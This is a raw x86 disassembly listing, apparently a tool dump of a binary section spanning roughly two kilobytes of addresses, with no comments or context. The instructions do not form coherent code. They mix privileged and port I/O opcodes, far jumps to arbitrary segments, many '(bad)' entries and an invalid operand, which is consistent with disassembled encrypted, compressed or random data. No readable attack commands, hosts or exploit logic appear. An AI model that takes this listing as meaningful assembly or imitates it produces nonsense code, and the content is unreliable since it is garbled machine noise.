  410ccd:	out    dx,al
  410cce:	xor    eax,0xf96a78af
  410cd3:	mov    bh,0x53
  410cd5:	fisttp WORD PTR [eax]
  410cd7:	or     al,0x28
  410cd9:	mov    esi,0x91ae42d8
  410cde:	arpl   WORD PTR [esi+ebp*8+0x32da1519],sp
  410ce5:	ficom  WORD PTR [edi]
  410ce7:	jo     0x410ce5
  410ce9:	dec    esp
  410cea:	mov    al,ds:0xb9505498
  410cef:	pop    ss
  410cf0:	push   eax
  410cf1:	dec    ebp
  410cf2:	push   esp
  410cf3:	xchg   ecx,eax
  410cf4:	aas    
  410cf5:	imul   esp,eax,0xffffff88
  410cf8:	sbb    ah,0xe6
  410cfb:	or     ebx,DWORD PTR [edx-0x5c]
  410cfe:	dec    ebx
  410cff:	or     eax,0xe57def33
  410d04:	das    
  410d05:	mov    dl,0x2a
  410d07:	xor    al,0x6b
  410d09:	sub    eax,0x2c3b09a7
  410d0e:	lds    eax,FWORD PTR [eax+0x13]
  410d11:	mov    eax,0xdff17e51
  410d16:	cmp    eax,0x4d3f23b8
  410d1b:	inc    edi
  410d1c:	retf   0x4f0f
  410d1f:	add    esp,DWORD PTR [ebx+0x3208063c]
  410d25:	in     al,0xe5
  410d27:	call   0x83e6:0x5ce34e1f
  410d2e:	pop    ecx
  410d2f:	mov    ?,WORD PTR [ebx+ebp*2+0x910e913]
  410d36:	loop   0x410d1f
  410d38:	clc    
  410d39:	pop    edx
  410d3a:	push   ss
  410d3b:	mov    ch,0x1
  410d3d:	retf   
  410d3e:	adc    DWORD PTR [edi+0x45],ecx
  410d41:	inc    ebx
  410d42:	shl    DWORD PTR [esi-0x52],0x4b
  410d46:	adc    eax,0xb5697d44
  410d4b:	jo     0x410dbc
  410d4d:	rol    DWORD PTR [ebx+0x4e6a7e11],1
  410d53:	ja     0x410d54
  410d55:	or     BYTE PTR [edx+0x23c29aa],0x15
  410d5c:	lahf   
  410d5d:	imul   edi,DWORD PTR [edi+0x5dec812f],0xffffffa6
  410d64:	retf   
  410d65:	ret    0xae9d
  410d68:	or     cl,ah
  410d6a:	jg     0x410d12
  410d6c:	mov    es,ebp
  410d6e:	inc    ebp
  410d6f:	mov    eax,ds:0x21a56557
  410d74:	test   eax,0x3903806c
  410d79:	gs sbb edx,esi
  410d7c:	inc    esi
  410d7d:	outs   dx,BYTE PTR ds:[esi]
  410d7e:	adc    al,0xc6
  410d80:	or     al,0xd7
  410d82:	std    
  410d83:	dec    edi
  410d84:	xchg   bh,ah
  410d86:	int    0xa9
  410d88:	mov    ecx,0x951b6e04
  410d8d:	and    bl,ah
  410d8f:	test   ch,0x63
  410d92:	cmp    dl,BYTE PTR [ebx-0x5f]
  410d95:	lds    eax,FWORD PTR [edx-0x61]
  410d98:	aam    0x93
  410d9a:	adc    eax,0xad512d41
  410d9f:	aas    
  410da0:	(bad)  
  410da1:	(bad)  
  410da2:	iret   
  410da3:	dec    eax
  410da4:	xchg   esp,eax
  410da5:	jmp    0x410d35
  410da7:	dec    ecx
  410da8:	test   edx,esi
  410daa:	cmp    edx,DWORD PTR [ebx+ebx*4-0x18ed9994]
  410db1:	jmp    0x1033:0xcc8bba40
  410db8:	lock call 0x53e2315d
  410dbe:	cmp    al,0x22
  410dc0:	and    al,0x9c
  410dc2:	scas   al,BYTE PTR es:[edi]
  410dc3:	ret    
  410dc4:	mov    al,0x7
  410dc6:	push   0xf1b73ccf
  410dcb:	scas   eax,DWORD PTR es:[edi]
  410dcc:	dec    ebx
  410dcd:	ror    DWORD PTR [ebp-0x5c50c3dd],cl
  410dd3:	pop    esi
  410dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dd5:	jns    0x29a557d9
  410ddb:	adc    BYTE PTR [esi],dl
  410ddd:	aaa    
  410dde:	mov    dl,0x14
  410de0:	enter  0x60d4,0x32
  410de4:	int3   
  410de5:	(bad)  [edi-0x259d9d1a]
  410deb:	out    0xee,al
  410ded:	mov    bh,0xc4
  410def:	call   0x9ae3:0x99d6e20b
  410df6:	mov    cl,0xe2
  410df8:	retf   0x834a
  410dfb:	xchg   DWORD PTR [esi+0x1a1ff35d],ebx
  410e01:	(bad)  
  410e02:	loopne 0x410dc9
  410e04:	xchg   ebx,eax
  410e05:	leave  
  410e06:	addr16 into 
  410e08:	addr16 data16 sbb al,0xf
  410e0c:	mov    dl,0x56
  410e0e:	sahf   
  410e0f:	xchg   ebx,eax
  410e10:	cmp    BYTE PTR [ecx],dh
  410e12:	push   cs
  410e13:	cmp    al,0xc
  410e15:	daa    
  410e16:	push   esi
  410e17:	jnp    0x410de2
  410e19:	ficomp WORD PTR [esi-0x7e]
  410e1c:	mov    DWORD PTR [eax+0x3a],0xde5932bf
  410e23:	or     al,0x6e
  410e25:	jno    0x410dd3
  410e27:	push   es
  410e28:	add    eax,0x243b57c
  410e2d:	jo     0x410e64
  410e2f:	push   esp
  410e30:	add    esi,DWORD PTR [ecx+ecx*8+0x7bc81830]
  410e37:	pop    ebp
  410e38:	and    eax,0x9dcdb30e
  410e3d:	pop    eax
  410e3e:	jmp    0x410e50
  410e40:	xchg   ebp,eax
  410e41:	add    BYTE PTR [eax-0x6c4b2559],cl
  410e47:	cli    
  410e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e49:	xor    BYTE PTR ds:0x22b9648e,bh
  410e4f:	lahf   
  410e50:	mov    eax,0x3f1107d0
  410e55:	loope  0x410e29
  410e57:	cmp    DWORD PTR [ecx-0x62],0xdf3a8303
  410e5e:	repz shr DWORD PTR [edx-0xe],0x54
  410e63:	jmp    0x410eb8
  410e65:	out    dx,al
  410e66:	pop    es
  410e67:	or     eax,0x269e7199
  410e6c:	cmp    ch,BYTE PTR [ecx-0x61b5cdda]
  410e72:	ds stos BYTE PTR es:[edi],al
  410e74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e75:	sbb    eax,0x86854a0c
  410e7a:	jecxz  0x410ec2
  410e7c:	mov    cl,0xe
  410e7e:	push   ss
  410e7f:	sbb    eax,0x2aad35ff
  410e84:	xchg   edx,eax
  410e85:	ds mov bl,0x9e
  410e88:	scas   al,BYTE PTR es:[edi]
  410e89:	cmp    DWORD PTR [ecx+0x2d],eax
  410e8c:	and    BYTE PTR [esp+edi*4],dh
  410e8f:	dec    esp
  410e90:	push   0xb6d3cb3d
  410e95:	mov    ds:0x1d2d2eae,eax
  410e9a:	or     dh,BYTE PTR [edi]
  410e9c:	and    DWORD PTR [edi+eiz*4],esi
  410e9f:	sbb    al,0xa
  410ea1:	cmc    
  410ea2:	pop    esp
  410ea3:	add    al,BYTE PTR [ebx+0x69d2439]
  410ea9:	in     eax,0xf5
  410eab:	pop    ds
  410eac:	rol    esp,1
  410eae:	mov    dh,0x42
  410eb0:	into   
  410eb1:	mov    dh,ah
  410eb3:	adc    ebp,DWORD PTR [edx]
  410eb5:	mov    edi,0xedd679dd
  410eba:	mov    bh,0x28
  410ebc:	rol    DWORD PTR [edi-0x12d0fb4],1
  410ec2:	ret    
  410ec3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ec5:	inc    edx
  410ec6:	je     0x410e77
  410ec8:	imul   esp,DWORD PTR [eax],0xffffff8e
  410ecb:	inc    esi
  410ecc:	js     0x410f1e
  410ece:	cwde   
  410ecf:	push   ss
  410ed0:	pop    eax
  410ed1:	in     eax,dx
  410ed2:	fsub   st,st(4)
  410ed4:	daa    
  410ed5:	mov    ss,WORD PTR [ebp-0x1c0050e5]
  410edb:	imul   ebx,DWORD PTR [edx-0x3],0xe48d19d8
  410ee2:	scas   eax,DWORD PTR es:[edi]
  410ee3:	(bad)  [esp+esi*4-0x55c626e5]
  410eea:	xor    al,0xeb
  410eec:	out    dx,al
  410eed:	cwde   
  410eee:	jecxz  0x410f21
  410ef0:	xor    BYTE PTR [eax],ah
  410ef2:	imul   ebx,DWORD PTR [edi-0x57],0x0
  410ef6:	push   ss
  410ef7:	lea    ebx,[edx]
  410ef9:	not    BYTE PTR [esi+esi*2+0x12]
  410efd:	add    al,0x8f
  410eff:	(bad)  
  410f00:	xor    eax,DWORD PTR [ebp-0x44]
  410f03:	je     0x410ed9
  410f05:	mov    bl,BYTE PTR [esi-0x738c05c5]
  410f0b:	sub    ecx,DWORD PTR [esi-0x2731e4ee]
  410f11:	shr    ebx,0x3
  410f14:	loopne 0x410eae
  410f16:	dec    ebx
  410f17:	xor    eax,0xc99e1f28
  410f1c:	cli    
  410f1d:	xor    edi,edi
  410f1f:	ret    
  410f20:	fsubp  st(3),st
  410f22:	call   0x3c0b:0x71fbc33e
  410f29:	push   es
  410f2a:	jne    0x410f3a
  410f2c:	js     0x410f29
  410f2e:	add    DWORD PTR [edi],esi
  410f30:	daa    
  410f31:	ins    BYTE PTR es:[edi],dx
  410f32:	adc    ch,ah
  410f34:	inc    eax
  410f35:	jnp    0x410f45
  410f37:	xchg   edi,eax
  410f38:	dec    edx
  410f39:	mov    ds:0xab895bef,eax
  410f3e:	mov    ecx,0x65e436df
  410f43:	jb     0x410fa1
  410f45:	sahf   
  410f46:	jmp    0x193d7fb
  410f4b:	or     BYTE PTR [edi+0x79],ah
  410f4e:	out    0x17,eax
  410f50:	popf   
  410f51:	or     al,0x68
  410f53:	dec    DWORD PTR [edi+0x51b35e54]
  410f59:	lods   al,BYTE PTR ds:[esi]
  410f5a:	add    al,0xaa
  410f5c:	(bad)  
  410f5d:	xchg   DWORD PTR [ebx-0x512ab531],ebp
  410f63:	inc    eax
  410f64:	adc    ah,ch
  410f66:	inc    esp
  410f67:	enter  0xd1ac,0xac
  410f6b:	mul    BYTE PTR [ebp-0x199e6c9a]
  410f71:	and    bh,ah
  410f73:	imul   ecx
  410f75:	mov    bl,0x8c
  410f77:	xor    al,dl
  410f79:	mov    ebx,0x13ffdb63
  410f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f7f:	or     al,0x5b
  410f81:	enter  0x6726,0x5d
  410f85:	inc    ecx
  410f86:	xchg   esp,eax
  410f87:	or     BYTE PTR [eax+ebp*2],dh
  410f8a:	shr    BYTE PTR [edx-0x76],0x26
  410f8e:	rcr    BYTE PTR [eax-0x41],0x7c
  410f92:	jp     0x411002
  410f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f95:	js     0x411016
  410f97:	es xchg ebp,eax
  410f99:	int    0x50
  410f9b:	lds    esi,FWORD PTR [esi-0x3d02592c]
  410fa1:	loop   0x410f9e
  410fa3:	cmc    
  410fa4:	test   DWORD PTR [ebp-0x43],0x4a0ce3da
  410fab:	cmp    BYTE PTR [edx+0x3070b53e],bh
  410fb1:	mov    al,ds:0x9de1d780
  410fb6:	into   
  410fb7:	inc    eax
  410fb8:	(bad)  [ebx+ebx*8-0x6dfdcbd3]
  410fbf:	fcomp  st(4)
  410fc1:	(bad)  
  410fc2:	out    dx,eax
  410fc3:	add    ah,BYTE PTR [ebp-0x1d]
  410fc6:	push   esi
  410fc7:	add    DWORD PTR [ebx+0x19],esi
  410fca:	scas   eax,DWORD PTR es:[edi]
  410fcb:	inc    edx
  410fcc:	mov    bh,0x97
  410fce:	out    dx,eax
  410fcf:	mov    esp,gs
  410fd1:	and    ebx,DWORD PTR [ecx-0x7f]
  410fd4:	addr16 xor edi,0x44
  410fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd9:	jne    0x411033
  410fdb:	and    BYTE PTR ss:[edi-0x61],al
  410fdf:	sysenter 
  410fe1:	cmp    DWORD PTR [ebp+0x54487b5d],ebp
  410fe7:	pop    edi
  410fe8:	pop    ecx
  410fe9:	fistp  WORD PTR [ebx-0x5cac3aca]
  410fef:	jecxz  0x410fcd
  410ff1:	pop    ds
  410ff2:	clc    
  410ff3:	sbb    DWORD PTR [edx+eax*2],0xf5b803ad
  410ffa:	(bad)  
  410ffb:	(bad)  ds:0x7532782
  411001:	sti    
  411002:	es adc eax,0x345eb14a
  411008:	dec    eax
  411009:	dec    esi
  41100a:	imul   ecx,DWORD PTR [edx-0x3e4f262d],0x46
  411011:	outs   dx,BYTE PTR ds:[esi]
  411012:	push   edx
  411013:	pusha  
  411014:	xchg   BYTE PTR [edx-0x36da8cbd],dh
  41101a:	call   0xcbf0:0xe81cb759
  411021:	sbb    al,0x24
  411023:	dec    ecx
  411024:	cmp    dh,cl
  411026:	lahf   
  411027:	nop
  411028:	jg     0x411008
  41102a:	jbe    0x410fe5
  41102c:	mov    cs,WORD PTR [eax-0x3c]
  41102f:	mov    al,ds:0x6485f47d
  411034:	lods   eax,DWORD PTR ds:[esi]
  411035:	int3   
  411036:	rcr    BYTE PTR [ecx-0xf57e4a3],1
  41103c:	and    eax,0xc40efc7f
  411041:	leave  
  411042:	dec    esi
  411043:	ret    0x7ee4
  411046:	mov    esi,0xf2f13a25
  41104b:	push   ebp
  41104c:	jnp    0x4110c2
  41104e:	icebp  
  41104f:	aad    0x84
  411051:	lods   al,BYTE PTR ds:[esi]
  411052:	in     al,0x6e
  411054:	cmp    edx,DWORD PTR [edx+0x4ffa613b]
  41105a:	push   edx
  41105b:	jnp    0x41107c
  41105d:	or     BYTE PTR [edx+0x1],dl
  411060:	int3   
  411061:	jle    0x4110b9
  411063:	lock xor ecx,DWORD PTR [esi+ecx*8]
  411067:	mov    esi,0xd4344e02
  41106c:	shr    DWORD PTR [edx],1
  41106e:	mov    bh,0xdc
  411070:	add    al,0x32
  411072:	pop    esp
  411073:	fisub  WORD PTR [edi+0x62ec58b9]
  411079:	fld    QWORD PTR [esi-0x1f]
  41107c:	jg     0x4110e1
  41107e:	not    edi
  411080:	mov    ebx,0xdf22a6ff
  411085:	aam    0xa2
  411087:	rcr    DWORD PTR [edx],0x2d
  41108a:	loop   0x4110ab
  41108c:	cwde   
  41108d:	ins    DWORD PTR es:[edi],dx
  41108e:	sbb    al,0x83
  411090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411091:	sti    
  411092:	xchg   edi,eax
  411093:	aad    0xcc
  411095:	sub    al,0xfe
  411097:	fild   QWORD PTR [edi-0x49a1da7c]
  41109d:	aaa    
  41109e:	(bad)  
  41109f:	popf   
  4110a0:	and    eax,0xf29f63ad
  4110a5:	mov    edx,0xcc44ca54
  4110aa:	call   0xdc26f59c
  4110af:	dec    esp
  4110b0:	aaa    
  4110b1:	and    esi,DWORD PTR [esi+0x3b]
  4110b4:	xchg   BYTE PTR [edx],ch
  4110b6:	jmp    0xd786:0x2a6e7278
  4110bd:	nop
  4110be:	xchg   DWORD PTR [eax],eax
  4110c0:	mov    ch,0x41
  4110c2:	sub    cl,BYTE PTR [esi+0x14]
  4110c5:	mov    al,ds:0x8d4e90df
  4110ca:	dec    eax
  4110cb:	arpl   WORD PTR [ecx-0x2994ff2d],bp
  4110d1:	das    
  4110d2:	cmp    edi,ebx
  4110d4:	mov    bl,cl
  4110d6:	mov    ecx,0xca5de540
  4110db:	lods   eax,DWORD PTR ds:[esi]
  4110dc:	jo     0x41107e
  4110de:	dec    esi
  4110df:	fbld   TBYTE PTR [eax-0x48]
  4110e2:	bound  edx,QWORD PTR [ebp-0x6d]
  4110e5:	pop    ecx
  4110e6:	fscale 
  4110e8:	dec    eax
  4110e9:	mov    cl,0x3e
  4110eb:	mov    ebp,0xdb2a7e08
  4110f0:	and    DWORD PTR [edx-0x5f6d6aad],ebp
  4110f6:	pop    ss
  4110f7:	sahf   
  4110f8:	xchg   al,bh
  4110fa:	dec    edx
  4110fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110fc:	gs mov ecx,0x388167b
  411102:	sbb    al,0x29
  411104:	inc    esi
  411105:	(bad)  
  411106:	rcr    DWORD PTR [ecx+0x20],1
  411109:	mov    eax,ds:0x4b8ef5e4
  41110e:	not    ch
  411110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411111:	in     al,0xf6
  411113:	add    eax,esp
  411115:	sub    eax,DWORD PTR [ebx]
  411117:	mov    edx,DWORD PTR [edx+0x9]
  41111a:	sub    BYTE PTR [edx+0x1df1568f],dh
  411120:	cmp    DWORD PTR [ecx+edx*2-0x64],ebx
  411124:	and    ecx,edx
  411126:	(bad)  [edx-0x4af61ac4]
  41112c:	aaa    
  41112d:	lods   eax,DWORD PTR ds:[esi]
  41112e:	outs   dx,BYTE PTR ds:[esi]
  41112f:	repnz or eax,0xb48844d3
  411135:	test   eax,0x50914058
  41113a:	je     0x4110fa
  41113c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41113d:	or     esp,edx
  41113f:	pusha  
  411140:	jo     0x4110ca
  411142:	add    eax,0xa4fb6bb0
  411147:	inc    edi
  411148:	mov    ebx,0x19822963
  41114d:	cmp    BYTE PTR [edi],cl
  41114f:	mov    BYTE PTR [esi-0x8c8fb2],dh
  411155:	in     eax,0xaa
  411157:	jne    0x411112
  411159:	imul   esp,DWORD PTR [edi+0x4b],0xffffffac
  41115d:	sub    dl,BYTE PTR [eax+eiz*8+0x39]
  411161:	adc    DWORD PTR [eax+ebx*4],edi
  411164:	je     0x41117a
  411166:	in     al,0x45
  411168:	test   eax,0xd793cb3
  41116d:	fild   WORD PTR [edx]
  41116f:	and    esi,DWORD PTR [edi-0x3dcdf2f]
  411175:	push   ss
  411176:	gs mov cl,0x35
  411179:	ja     0x41113c
  41117b:	inc    esp
  41117c:	push   edx
  41117d:	sub    eax,0xca91b44b
  411182:	mov    ss,WORD PTR [edx-0x20ba962b]
  411188:	push   ecx
  411189:	pop    esi
  41118a:	cdq    
  41118b:	cmp    eax,DWORD PTR [edi+0x48]
  41118e:	mov    ebx,0x27801f15
  411193:	inc    ebx
  411194:	lahf   
  411195:	dec    edx
  411196:	add    bl,BYTE PTR [ecx]
  411198:	int    0xde
  41119a:	cmp    ah,BYTE PTR [eax-0x1e62b2c]
  4111a0:	repnz and eax,0xadfc8969
  4111a6:	xchg   edi,eax
  4111a7:	leave  
  4111a8:	xor    al,0xab
  4111aa:	jp     0x4111a3
  4111ac:	jns    0x4111a4
  4111ae:	les    eax,FWORD PTR [eax+eax*1-0x72b1dfd5]
  4111b5:	iret   
  4111b6:	lds    ebx,FWORD PTR [ecx+edx*1]
  4111b9:	mov    cl,0x45
  4111bb:	adc    BYTE PTR [edx+0x39],cl
  4111be:	shl    BYTE PTR [edx],1
  4111c0:	jge    0x41119d
  4111c2:	bound  ebp,QWORD PTR [eax]
  4111c4:	loopne 0x411185
  4111c6:	push   ebx
  4111c7:	inc    edx
  4111c8:	dec    ebp
  4111c9:	lea    esp,[esi+0x11]
  4111cc:	bound  esi,QWORD PTR [edx+esi*8+0x57]
  4111d0:	stc    
  4111d1:	cmp    DWORD PTR [ecx-0x267db937],ebx
  4111d7:	or     BYTE PTR [edx-0x6478e7d5],bl
  4111dd:	mov    ecx,0xb450cc0
  4111e2:	in     eax,0xf9
  4111e4:	push   esi
  4111e5:	out    dx,al
  4111e6:	xchg   DWORD PTR [edx-0x645fc833],esi
  4111ec:	and    DWORD PTR [ebx-0x2d16a24a],0xfaf56f1e
  4111f6:	aaa    
  4111f7:	ficom  DWORD PTR [ebx+0x5b]
  4111fa:	pop    eax
  4111fb:	inc    esp
  4111fc:	cmp    BYTE PTR [edx+0x157bd8bf],ch
  411202:	outs   dx,DWORD PTR ds:[esi]
  411203:	and    eax,DWORD PTR [edi-0x6e]
  411206:	(bad)  
  411207:	call   0xd32a:0x530c928f
  41120e:	aad    0x7
  411210:	dec    edi
  411211:	xchg   esi,eax
  411212:	hlt    
  411213:	pop    ecx
  411214:	es popf 
  411216:	push   esp
  411217:	sbb    ecx,ebx
  411219:	stc    
  41121a:	jo     0x41125a
  41121c:	ins    BYTE PTR es:[edi],dx
  41121d:	mov    ebx,0xb8d66a72
  411222:	scas   al,BYTE PTR es:[edi]
  411223:	inc    edi
  411224:	ds cs aaa 
  411227:	xor    DWORD PTR [edi+ebx*4+0x49cede24],ebp
  41122e:	jb     0x4111d5
  411230:	dec    edi
  411231:	adc    BYTE PTR [eax-0x2c],ah
  411234:	cwde   
  411235:	ret    0xfa08
  411238:	(bad)  
  41123a:	(bad)  
  41123b:	ja     0x41123c
  41123d:	mov    eax,0x30fd675f
  411242:	data16 fs sti 
  411245:	test   DWORD PTR [edi+0x24],esp
  411248:	cmp    ebx,DWORD PTR [ebx+0x48]
  41124b:	mov    bl,0xbc
  41124d:	cmp    eax,DWORD PTR [eax-0x3c279754]
  411253:	pushf  
  411254:	or     DWORD PTR ds:0xcadbb7a9,eax
  41125a:	jo     0x4111f2
  41125c:	daa    
  41125d:	pop    esi
  41125e:	mov    ds,WORD PTR [eax+0x2a0c9bdc]
  411264:	mov    ds:0x345c6b28,al
  411269:	data16 aaa 
  41126b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41126c:	sbb    ch,ah
  41126e:	sti    
  41126f:	cld    
  411270:	hlt    
  411271:	pop    esi
  411272:	xchg   esi,eax
  411273:	daa    
  411274:	xchg   BYTE PTR [ebx+eax*4+0xb7da4fc],ah
  41127b:	mov    esi,0x1f167ccf
  411280:	ret    
  411281:	imul   edx,DWORD PTR [esi],0x955e2e3b
  411287:	das    
  411288:	push   ebx
  411289:	xor    edi,esi
  41128b:	je     0x4112e1
  41128d:	add    BYTE PTR [eax+0x2b],bh
  411290:	dec    ebp
  411291:	cwde   
  411292:	mov    dl,0x3f
  411294:	sbb    eax,0x97a8f01e
  411299:	mov    bp,0x799b
  41129d:	out    dx,al
  41129e:	mov    ecx,DWORD PTR [eax-0x30]
  4112a1:	mov    fs,WORD PTR [ecx+edi*8+0x1455e23c]
  4112a8:	out    dx,al
  4112a9:	mov    ecx,0x370f7384
  4112ae:	in     eax,dx
  4112af:	lds    edx,FWORD PTR [edx-0x2c]
  4112b2:	add    al,0x35
  4112b4:	xchg   BYTE PTR [edx+0x21],dh
  4112b7:	cmp    eax,0xeb4d784
  4112bc:	mov    ss,WORD PTR [ebp+0x406ca981]
  4112c2:	xor    edi,DWORD PTR [eax+0x49]
  4112c5:	psubq  mm1,mm3
  4112c8:	sub    al,0x7a
  4112ca:	jmp    0x42c51e16
  4112cf:	lahf   
  4112d0:	retf   
  4112d1:	inc    edi
  4112d2:	ins    BYTE PTR es:[edi],dx
  4112d3:	mov    eax,ds:0x10d326e8
  4112d8:	jle    0x411294
  4112da:	lds    edi,FWORD PTR [esp+ecx*1]
  4112dd:	inc    esp
  4112de:	dec    ebp
  4112df:	retf   0x5e3d
  4112e2:	jecxz  0x411317
  4112e4:	push   edi
  4112e5:	cmp    BYTE PTR [edi-0x47],bl
  4112e8:	lods   al,BYTE PTR ds:[esi]
  4112e9:	shl    DWORD PTR [ecx],1
  4112eb:	int3   
  4112ec:	dec    ecx
  4112ed:	in     al,dx
  4112ee:	sub    ebp,DWORD PTR [ebx+0x35d4a798]
  4112f4:	mov    BYTE PTR [edx-0x44],0x7c
  4112f8:	sub    eax,0xf452268a
  4112fd:	stos   DWORD PTR es:[edi],eax
  4112fe:	stos   DWORD PTR es:[edi],eax
  4112ff:	clc    
  411300:	jle    0x411358
  411302:	xor    BYTE PTR [ecx+0x6340b7cc],0xd9
  411309:	inc    edx
  41130a:	sbb    eax,0xe0d1c549
  41130f:	into   
  411310:	test   eax,0xee8f8722
  411315:	mov    DWORD PTR [ecx+0x676fdb30],0x3d7c6a3b
  41131f:	and    eax,0x8495901a
  411324:	xor    al,BYTE PTR [ecx-0x1e5a3f6f]
  41132a:	sub    eax,0xd2daee67
  41132f:	xor    BYTE PTR [esi-0x5569f905],0x77
  411336:	arpl   WORD PTR ds:[ecx+0x4e00bd00],si
  41133d:	add    edi,DWORD PTR [ebp-0x3f27bb15]
  411343:	or     eax,0x285926f2
  411348:	ror    DWORD PTR [eax],cl
  41134a:	arpl   WORD PTR [edi+esi*2-0x7f],ax
  41134e:	jg     0x4112ee
  411350:	mov    ebp,0x6501e0
  411355:	int3   
  411356:	jmp    0x4112e2
  411358:	push   eax
  411359:	rcr    DWORD PTR [esi-0x53],cl
  41135c:	popf   
  41135d:	xchg   edx,eax
  41135e:	ja     0x4112ed
  411360:	shl    DWORD PTR [ebp+0xa],1
  411363:	aas    
  411364:	mov    dh,0x3b
  411366:	xchg   ecx,eax
  411367:	imul   edi,DWORD PTR [esp+ebx*8+0x5e],0x147ac389
  41136f:	es mov bh,0xf9
  411372:	dec    ecx
  411373:	scas   eax,DWORD PTR es:[edi]
  411374:	sub    DWORD PTR [ebp-0x3df1c365],eax
  41137a:	sbb    esp,ecx
  41137c:	stos   BYTE PTR es:[edi],al
  41137d:	cmp    edx,esi
  41137f:	(bad)  
  411381:	arpl   WORD PTR [ecx],bp
  411383:	aam    0xe3
  411385:	popa   
  411386:	sti    
  411387:	xor    DWORD PTR [edi+edx*2-0x55],edx
  41138b:	dec    eax
  41138c:	bound  eax,QWORD PTR [eax+0x1e7c1e7a]
  411392:	mov    bh,0x36
  411394:	push   eax
  411395:	mov    eax,ds:0xe9698700
  41139a:	ins    DWORD PTR es:[edi],dx
  41139b:	inc    ebp
  41139c:	(bad)  
  41139d:	repnz jecxz 0x411394
  4113a0:	jno    0x4113af
  4113a2:	idiv   DWORD PTR [eax-0xe79f50b]
  4113a8:	adc    dh,al
  4113aa:	mov    DWORD PTR [ecx+0x11],0x7b4cc865
  4113b1:	and    DWORD PTR [ecx+ecx*8-0x3a344a74],esp
  4113b8:	adc    al,0x3f
  4113ba:	lahf   
  4113bb:	xchg   BYTE PTR [edx-0x4ffdc782],dh
  4113c1:	cmc    
  4113c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113c3:	push   cs
  4113c4:	push   0xc452b936
  4113c9:	sub    eax,0xfd4e6052
  4113ce:	cld    
  4113cf:	scas   eax,DWORD PTR es:[edi]
  4113d0:	mov    esp,0x63556d85
  4113d5:	ins    BYTE PTR es:[edi],dx
  4113d6:	cmp    al,0x8b
  4113d8:	ret    
  4113d9:	dec    edi
  4113da:	xchg   edx,eax
  4113db:	sbb    eax,0x4ba6590
  4113e0:	mov    al,0xce
  4113e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e3:	mov    BYTE PTR [esi],al
  4113e5:	mov    cl,0x79
  4113e7:	aaa    
  4113e8:	out    0x58,al
  4113ea:	pop    edi
  4113eb:	sub    edx,DWORD PTR [ecx+0x7e]
  4113ee:	clc    
  4113ef:	(bad)  
  4113f0:	pop    edi
  4113f1:	icebp  
  4113f2:	dec    eax
  4113f3:	in     al,0x22
  4113f5:	aaa    
  4113f6:	sub    dl,al
  4113f8:	ret    0x5737
  4113fb:	inc    eax
  4113fc:	jmp    0x7b8e:0x88b29d56
  411403:	xor    bh,BYTE PTR [esp+ebx*2]
  411406:	pop    DWORD PTR [esi-0x47aec910]
  41140c:	push   es
  41140d:	stos   BYTE PTR es:[edi],al
  41140e:	sub    eax,0x58959509
  411413:	xchg   ebx,eax
  411414:	addr16 and bh,dl
  411417:	fisttp WORD PTR [ecx]
  411419:	inc    eax
  41141a:	sbb    eax,0x73743095
  41141f:	in     eax,0xd1
  411421:	iret   
  411422:	shr    DWORD PTR [esi],cl
  411424:	xor    BYTE PTR [ebp+0x14d11080],dl
  41142a:	and    BYTE PTR [ebp-0x5f],0x4a
  41142e:	retf   
  41142f:	push   ecx
  411430:	aad    0xb8
  411432:	or     eax,0x4d63572c
  411437:	adc    al,0xd4
  411439:	mov    bl,0x4d
  41143b:	xchg   esi,eax
  41143c:	(bad)  
  41143d:	pop    edi
  41143e:	mov    dh,0x23
  411440:	cmp    ecx,DWORD PTR [esi+0x24d6f4fb]
  411446:	sbb    ch,dh
  411448:	call   FWORD PTR [ebp-0x1c]
  41144b:	add    cl,BYTE PTR [esi]
  41144d:	(bad)  
  41144e:	loopne 0x4114be
  411450:	xchg   edi,eax
  411451:	rol    dl,1
  411453:	int    0xd8
  411455:	pusha  
  411456:	in     eax,dx
  411457:	xchg   edi,eax
  411458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411459:	sti    
  41145a:	aas    
  41145b:	cmc    
  41145c:	scas   eax,DWORD PTR es:[edi]
  41145d:	pop    edi
  41145e:	mov    ds:0xf7c48046,al
  411464:	adc    ebp,DWORD PTR [ebx-0x50a1bcd4]
  41146a:	fisubr DWORD PTR [ecx+ebx*8+0x25]
  41146e:	adc    al,0xb3
  411470:	add    al,0xe3
  411472:	mov    dh,0xae
  411474:	and    eax,0x3c9576b6
  411479:	add    ch,BYTE PTR [edi+ecx*2-0x4e]
  41147d:	addr16 pop ecx
  41147f:	lea    esi,[ebx-0x36eac6c5]
  411485:	jb     0x4114a2
  411487:	and    al,al
  411489:	test   al,0x8d
  41148b:	lods   eax,DWORD PTR ds:[esi]
  41148c:	add    DWORD PTR [eax],ebx
  41148e:	pop    eax
  41148f:	outs   dx,BYTE PTR ds:[esi]
  411490:	mov    ss,WORD PTR [ecx+0x0]
  411493:	sbb    dh,BYTE PTR [edx-0x5]
  411496:	dec    ecx
  411497:	ds add bl,cl
  41149a:	jo     0x411432
  41149c:	in     al,0x4c
  41149e:	add    ebp,DWORD PTR [edi]
  4114a0:	adc    bh,BYTE PTR [eax+0x7559857b]
  4114a6:	scas   al,BYTE PTR es:[edi]
  4114a7:	cs push edx
  4114a9:	or     BYTE PTR [edx+0x6295efd6],0x83
  4114b0:	bound  esp,QWORD PTR [eax+edi*4-0x1a]
  4114b4:	loope  0x4114a6
  4114b6:	ds sbb eax,0xeb4b37f6
  4114bc:	add    al,BYTE PTR [ebp+0x74]
  4114bf:	jle    0x4114fb
  4114c1:	ins    DWORD PTR es:[edi],dx
  4114c2:	push   ecx
  4114c3:	ficom  DWORD PTR [esi*4-0x3c8635d6]
